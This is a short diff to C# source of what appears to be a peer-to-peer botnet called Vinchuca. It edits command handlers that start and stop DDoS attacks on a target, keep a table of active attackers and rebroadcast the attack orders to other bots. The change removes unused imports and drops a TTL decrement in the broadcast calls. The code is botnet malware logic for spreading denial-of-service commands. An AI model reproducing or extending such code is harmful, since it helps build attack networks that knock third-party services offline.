@@ -1,7 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Diagnostics;
-using System.Net.Configuration;
 using Vinchuca.Actions.DDoS;
 using Vinchuca.Network.Protocol.Messages;
 using Vinchuca.Network.Protocol.Messages.Command;
@@ -34,7 +31,7 @@ namespace Vinchuca.Network.Protocol.Handlers.Command
             Attacker.Logger.Info("Attacking ({2}) session {0} targeting {1} ", msg.AttackId, msg.Target, Enum.GetName(typeof(DosAttackMessage.DosType), msg.Type));
             Attacker.Attackers.Add(msg.AttackId, attacker);
 
-            _messageManager.Broadcast(msg, botMessage.Header.Ttl--);
+            _messageManager.Broadcast(msg, botMessage.Header.Ttl);
         }
     }
 
@@ -58,7 +55,7 @@ namespace Vinchuca.Network.Protocol.Handlers.Command
                 attacker.Stop();
                 Attacker.Attackers.Remove(msg.AttackId);
             }
-            _messageManager.Broadcast(msg, botMessage.Header.Ttl--);
+            _messageManager.Broadcast(msg, botMessage.Header.Ttl);
         }
     }
 
